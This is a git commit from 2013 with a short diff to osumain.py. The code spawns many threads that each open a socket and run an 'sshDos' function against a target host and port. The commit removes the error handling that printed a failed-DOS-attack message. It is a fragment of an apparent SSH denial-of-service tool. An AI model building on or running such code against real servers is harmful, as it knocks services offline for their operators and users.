a436486438af3e1230807b0702025f84e31698cd
c0r3dump3d <coredump@austitici.org>
2013-10-09 11:21:13 +0200

    Version 0.2.1

--- osumain.py
+++ osumain.py
@@ -181,8 +181,4 @@ def main():
 		        	for att in range(threads):
 					sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 					t = Thread(target=sshDos, args=(host, port, userfdos, sock, defTime))
-					try:
-			      			t.start()
-					except:
-						print "Imposible to make the DOS attack."
-						exit(1)
+			      		t.start()
